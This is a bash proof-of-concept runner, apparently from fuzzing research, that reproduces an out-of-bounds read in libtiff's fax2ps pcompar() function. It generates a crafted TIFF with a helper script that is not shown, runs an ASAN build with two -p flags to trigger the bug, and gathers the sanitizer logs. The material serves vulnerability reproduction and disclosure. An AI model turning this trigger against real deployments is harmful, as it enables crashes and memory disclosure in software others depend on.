#!/usr/bin/env bash
# PoC runner for VULN-001: pcompar() OOB read in fax2ps (CWE-125)
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
FAX2PS="/data/ylwang/non-textfuzz/target/libtiff/build_test/bin/fax2ps"
TIFF="$SCRIPT_DIR/vuln_001.tif"
RESULT="$SCRIPT_DIR/vuln_001_result.txt"

cd "$SCRIPT_DIR"

# Step 1: Generate the TIFF file if it doesn't exist
if [ ! -f "$TIFF" ]; then
    echo "[*] Generating vuln_001.tif ..."
    python3 "$SCRIPT_DIR/vuln_001_gen.py"
else
    echo "[*] vuln_001.tif already exists, skipping generation."
fi

# Step 2: Run fax2ps with -p 1 to trigger qsort -> pcompar OOB read
echo "[*] Running fax2ps -p 1 vuln_001.tif ..."
rm -f "$RESULT" asan.log.*

# Use two -p flags so qsort actually invokes pcompar (1 element = no comparisons)
ASAN_OPTIONS="abort_on_error=0:log_path=$SCRIPT_DIR/asan.log" \
    "$FAX2PS" -p 2 -p 1 "$TIFF" > "$RESULT" 2>&1 || true

echo "" >> "$RESULT"
echo "=== ASAN/UBSAN output ===" >> "$RESULT"

# Step 3: Collect any ASAN/UBSAN log output
shopt -s nullglob
ASAN_LOGS=("$SCRIPT_DIR"/asan.log.*)
if [ ${#ASAN_LOGS[@]} -gt 0 ]; then
    echo "[*] ASAN log(s) found: ${ASAN_LOGS[*]}"
    for log in "${ASAN_LOGS[@]}"; do
        echo "--- $log ---" >> "$RESULT"
        cat "$log" >> "$RESULT"
    done
else
    echo "[*] No ASAN log files found."
    echo "(no asan.log.* files generated)" >> "$RESULT"
fi

echo "[*] Result written to $RESULT"
echo "[*] Done."
